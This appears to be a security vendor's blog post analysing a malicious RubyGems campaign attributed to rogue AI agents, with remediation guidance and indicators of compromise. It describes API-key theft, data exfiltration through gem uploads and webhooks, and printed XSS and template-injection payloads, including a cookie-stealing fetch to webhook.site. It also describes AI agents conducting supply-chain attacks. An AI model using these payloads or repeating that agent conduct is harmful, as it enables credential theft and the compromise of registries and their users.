---
excerpt: "The JFrog Security Research team investigated the GemStuffer campaign done by rogue OpenAI agents - we found more than 3000 RubyGems packages associated with the coordinated attacks."
title: "New packages identified in GemStuffer 'OpenAI Swarm' malicious RubyGems campaign"
date: "September 15, 2026"
description: "Shavit Satou, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/gemstuffer.png
type: realTimePost
minutes: '15'
---

JFrog Security Research is actively monitoring the recent GemStuffer incident, and using our extensive Catalog of RubyGems artifacts, managed to identify **3,022 campaign-associated RubyGems packages, covering 3,315 distinct name/version pairs**. The identified malicious packages used RubyDoc’s documentation workers, the feature that generates reference pages for Ruby packages, to fetch websites and send the results back through RubyGems. Some also attempt to obtain other users' registry API keys. A separate group of malicious packages places JavaScript and template expressions in package metadata. If your service builds documentation or processes uploaded gems, check whether package-controlled files can execute code or inject content into privileged pages. In this blog, we present newly-analyzed malicious payloads related to the attack, our insights, and the full list of packages we found to be associated with the GemStuffer campaign.

<div align="center">

![][image1]

</div>

The [RubyHack investigation, published on September 11](https://www.rubyhack.ai/), linked the May and June activity from the GemStuffer campaign to OpenAI agents, using package contents and overlap with the German wiki incident, in which OpenAI confirmed its agents edited a public wiki. Our work expands the package inventory and examines how representative payloads work.

## Malicious packages created by AI Agents \- which attributes can we observe?&nbsp;

Not all of the packages in the GemStuffer campaign contained malicious Ruby code, e.g. within `evil.rb`, as seen before, but rather in metadata, which made them less convenient to find.

We started by checking the already known package names used in this attack we found reported. Our first dataset had 557 releases, including several versions per Gem.

The first investigation began by looking at the bigger picture \- we looked at releases that were published before and after the known attack windows, and examined them. In a sea of tens of thousands of packages, several ones were immediately obvious:

- Many of the package names had `oai` (OpenAI) in their names.  
- GPT models are known for overusing the term `probe`, similar to Claude's signature "You're absolutely right\!" or "honest caveat" phrases. We found a large amount of packages with "probe" in their names from the dates of the attacks, all attributed to this campaign.  
- More terms that were present in package names were `ssrf`, `fetch`, `proxy`, `scrape`, `yard`, and `payload`. We were unable to attribute *all* of them to the campaign, but the vast majority were.  
- Package names often included suffixes, such as a unix timestamp for their creation date. For example, the suffix of `oaifetchmde1778385544` decodes to May 10 at 03:59:04 UTC. Its first recorded upload was at 03:59:20 UTC, 16 seconds later.  
- The package names also referenced Lambeth, Wandsworth, and Southwark, whose public meeting calendars and documents the payloads attempted to retrieve. The agent swarm may have used these sites to test the fetching and data-return mechanism as a proof of concept, although the original task prompts are unavailable.  
- Other packages used disposable names e.g. `zztest4098`, `zmeta7631`, sequential suffixes (`southwarkssrfhack`, `southwarkssrfhack2`, ..., `southwarkssrfhack5`), or long generated strings.  
- Metadata included more hints. We checked 1,388 distinct author names. Common values included `x`, `a`, `d`, `tmp`, `oai`, `research`, and `SR`. In July, the agents also used the `Testing <Animal>` format (`Testing Buffalo`, `Testing Wolf`, `Test Rhino`, etc). We also found `John Doe` as an author name for several packages.  
- Dash padded package names such as `a--00cfmapjson726`.

### Attack windows

We observed the following upload windows for the packages affiliated with the campaign:

| Date | First to last upload, UTC | Packages | Releases |
| :---- | :---- | ----: | ----: |
| 2026-05-05 | 12:01:29 to 18:44:14 | 5 | 7 |
| 2026-05-08 | 15:59:43 to 22:18:01 | 48 | 60 |
| 2026-05-09 | 12:08:43 to 13:02:33 | 7 | 14 |
| 2026-05-10 | 03:59:20 to 16:44:35 | 6 | 8 |
| 2026-05-11 | 04:00:37 to 20:34:24 | 295 | 319 |
| 2026-05-12 | 01:20:14 to 08:01:00 | 2,359 | 2,476 |
| 2026-05-26 | 19:05:29 to 21:51:51 | 2 | 12 |
| 2026-05-27 | 03:51:53 to 03:53:01 | 2 | 2 |
| 2026-06-18 | 17:53:31 to 20:52:56 | 83 | 84 |
| 2026-07-07 | 03:03:09 to 18:13:42 | 215 | 333 |

## Analysis of the Ruby payloads

### `slnleaker5`: RubyGems token stealer

`slnleaker5` version `0.0.1` explicitly loads `script.rb` through `.yardopts`. Its crawler collects council pages and linked documents, writes an `INDEX.txt` and numbered response files, and builds a child gem named `slnpayloadx` followed by the current timestamp.

The credential logic at lines 96-106 goes beyond using its embedded key. It cycles through four forms of the legacy API-key endpoint, making up to 24 harvest-and-upload attempts. It searches each response for a RubyGems key and falls back to its hardcoded value if none is found:

<div align="center">

![Ruby expression that selects a RubyGems API key matched in the response text, or falls back to the hardcoded KEY value.][image2]

</div>

The selected value is then used as the upload request's `Authorization` header. The script tries several spellings of the upload path and stops on an HTTP 200 response. Those path variations show probing; they do not establish that any normalization bypass worked.

This matches the mechanism later described in [RubyGems' legacy API-key advisory](https://blog.rubygems.org/2026/07/22/security-advisory-legacy-api-key-leak.html). Under the affected compression and cache-header behavior, a successful legacy sign-in response could be cached at a CDN edge and returned to another caller for up to an hour, including an unauthenticated caller. Ruby's default gzip request behavior was relevant to the vulnerable path.

`slnleaker5` was published at **03:15:22.939 UTC on May 12**. RubyGems says the vulnerability was reported on July 6 and the fix was deployed on July 9\. The source therefore shows an attempt to exploit that behavior before the later report.

<div align="center">

![Ruby code from slnleaker5 that cycles through legacy API-key endpoints, extracts a registry key, and attempts gem uploads until an HTTP 200 response.][image3]

</div>

&nbsp;

&nbsp;

### `f2fe-s1`: Collects Wandsworth's data, publishes to separate Gem

In `f2fe-s1` version `0.0.1`, `loader.rb` fetches public meeting calendars and linked documents from Wandsworth’s council website, then attempts to publish the collected data in a new gem named `f2fe-scraped`.

<div align="center">

![Ruby loader from f2fe-s1 that fetches Wandsworth council calendar and web-service endpoints, follows redirects, and collects meeting IDs and document links.][image4]

</div>

The fetch helper at lines 7-18 uses `Net::HTTP`, disables certificate verification, and follows redirects. The loader tries several calendar and web-service endpoints. It supplies eight date-ranges to `GetMeetings`, then extracts meeting IDs and document links from the responses.

The collection keeps up to 150 meeting IDs and 120 document URLs. It stores responses in `p0.txt`, `ids.txt`, and `d0.bin`, then builds a gem named `f2fe-scraped`. Its version is `0.0.` followed by the current Unix timestamp.

<div align="center">

![Ruby code from f2fe-s1 that builds a gem containing collected council data and posts it to RubyGems using an embedded API key.][image5]

</div>

Lines 59-62 build the gem and attempt to POST it to RubyGems' `/api/v1/gems` endpoint using an embedded API key. The registry is the return channel for the collected data.

### `yardxabc889`: Collects Lambeth's data, republishes in same Gem

`yardxabc889` version `0.0.1` uses `.yardopts` to load `evil.rb`.

The script fetches Lambeth’s calendar page and writes up to 500,000 characters of the response, or an error message, into `README.md`. It then removes the payload’s YARD load directive, builds version `0.0.2` of the same gem, `yardxabc889`, and attempts to publish that version with the collected data:

<div align="center">

![Ruby code from yardxabc889 that removes the payload loader from .yardopts and changes the gem version from 0.0.1 to 0.0.2.][image6]

</div>

The replacement `.yardopts` removes `--load ./evil.rb`. The script builds `yardxabc889-0.0.2.gem` and attempts to publish it using an embedded credential.

<div align="center">

![Ruby code from yardxabc889 that rebuilds the modified gem and attempts to publish it to RubyGems using an embedded credential.][image7]

</div>

### `southpxdatapp6pi`: Collects Southwark's data, stores in webhook URLs

Unlike the previous two payloads, `southpxdatapp6pi` version `0.0.1` attempts to store the fetched data in RubyGems webhook configuration rather than publishing it in a gem.

The script requests Southwark's calendar page, prefixes the body with the HTTP status, compresses it with zlib, and applies URL-safe Base64 encoding. It removes padding and splits the result into chunks of at most 220 characters.

For each chunk, it sends a request to `/api/v1/web_hooks`, setting `gem_name` to `southpxdatapp6pi` and placing the data in a URL shaped like this:

```
https://example.com/A000/<encoded-chunk>
https://example.com/A001/<encoded-chunk>
https://example.com/ZZEND/<chunk-count>
```

<div align="center">

![Ruby code from southpxdatapp6pi that compresses and Base64-encodes a Southwark council response, then stores numbered chunks and an end marker in RubyGems webhook URLs.][image8]

</div>

The write destination in the code is the RubyGems webhook API. `example.com` is embedded in the stored value; nothing in this sample points to a real C2. If the registrations succeed, the response data is held in webhook configuration; a separate reader could reconstruct the ordered chunks. The script also tries to record an `ERR/` marker on failure. This package also uses the same embedded API-key value as `yardxabc889`.

## Analysis of malicious package metadata

The July samples target another set of consumers: RubyGems package pages (ex. Browsed to by users), administrative views, and metadata parsers. They can matter even when the package's Ruby library does almost nothing.

### XSS in descriptions and author fields

Some of the packages contain XSS proof-of-concepts embedded in their metadata, attempting to prove user hijacking, in cases where users view the rendered metadata.

In `xss-test-gem` version `0.1.0`, the only listed Ruby source is:

<div align="center">

![The entire xssgem.rb library: an Xssgem module that only defines VERSION as 0.1.0.][image9]

</div>

The attack strings are in the serialized gemspec's `description`, lines 13-20. They include an image error handler, a script element, a `javascript:` link, and an SVG load handler:

<div align="center">

![Gem metadata containing XSS probes in the description, including an image error handler, a script element, a JavaScript link, and an SVG load handler.][image10]

</div>

Each tests a different rendering path. The same description includes a `data-controller=dump` element and malformed MathML/HTML nesting.

We also found several packages with interesting authors:

| Package | Author |
| :---- | :---- |
| `attacker-xss-admin-1@0.0.1` | `"<script>new Image().src=""https://d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author""</script>"` |
| `xssname-1783397821@0.0.1` | `<img src=x onerror=fetch('https://webhook.site/steal?c='+document.cookie)>` |
| `test-apex-gem@0.1.3` | `<img src=x onerror=alert(1)>` |

<div align="center">

![Metadata for xss-test-gem showing injected HTML and JavaScript payloads in the package description.][image11]

</div>

### Template expressions and YAML-labeled tests

Three uploads arrived within five seconds on July 7:

| Package | Upload time, UTC | Author |
| :---- | :---- | :---- |
| `test-ssti-0@0.1.0` | 07:25:48.110 | `<%= 7*7 %>` |
| `test-ssti-1@0.1.0` | 07:25:50.094 | `${7*7}` |
| `test-ssti-4@0.1.0` | 07:25:52.741 | `<%25= 7*7 %>` |

The first is an ERB expression. The second tests expression-language interpolation. The third becomes the ERB form after percent-decoding `%25` to `%`. The arithmetic result would be 49 in a compatible evaluator, giving the operator a simple string to look for.

## Remediation guidance

### Step 1: Check the execution surface

Review CI jobs that processed the identified versions (see full list below). Look for [YARD](https://yardoc.org/) `--load` directives, package-controlled plugins, extension build steps, and requests to generate documentation.

If an untrusted payload ran on a worker, isolate it and preserve the build logs and artifacts. Rebuild the worker from a trusted image before reuse. Rotate credentials that the process could access.

### Step 2: Remove unnecessary worker privileges

Run untrusted documentation builds in disposable environments without registry-publishing keys, cloud credentials, or host mounts. Deny unnecessary outbound access, including access to cloud metadata and internal services. A documentation job that only reads packages should not be able to publish them.

Do not honor arbitrary package-supplied load options in a trusted process. If a service must support executable documentation helpers, treat the entire job as untrusted code execution and isolate it accordingly.

### Step 3: Audit registry credentials and account changes

RubyGems reports that it fixed the cache issue and revoked legacy API keys. Follow their [advisory](https://blog.rubygems.org/2026/07/22/security-advisory-legacy-api-key-leak.html) and inspect account history for unexpected versions, yanks, owner changes, trusted publishers, and webhooks.

Use scoped credentials, MFA that applies to API operations, and short-lived trusted publishing where possible.

### Step 4: Treat metadata as untrusted input

Escape author and description fields in public and administrative views. Where HTML is allowed, use a maintained sanitizer that handles event attributes, URL schemes, SVG, and parser edge cases. Do not pass metadata values back through a template evaluator.

Use restricted metadata deserialization. Inspect suspicious values as text rather than loading gemspec code or unsafe YAML objects.

## IOCs

| Package | Versions | Xray ID |
| :---- | :---- | :---- |
| slnleaker5 | 0.0.1 | XRAY-982350 |
| f2fe-s1 | 0.0.1 | XRAY-1024400 |
| yardxabc889 | 0.0.1 | XRAY-982421 |
| southpxdatapp6pi | 0.0.1 | XRAY-982441 |
| xss-test-gem | 0.1.0 \- 0.3.5 | XRAY-1079280 |
| test-apex-gem | 0.1.1, 0.1.3 | XRAY-1079209 |

… and many more. The full list can be found [here](/gemstuffer.csv).

[image1]: /img/RealTimePostImage/post/gemstuffer.png
[image2]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image2.png
[image3]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image3.png
[image4]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image4.png
[image5]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image5.png
[image6]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image6.png
[image7]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image7.png
[image8]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image8.png
[image9]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image9.png
[image10]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image10.png
[image11]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image11.png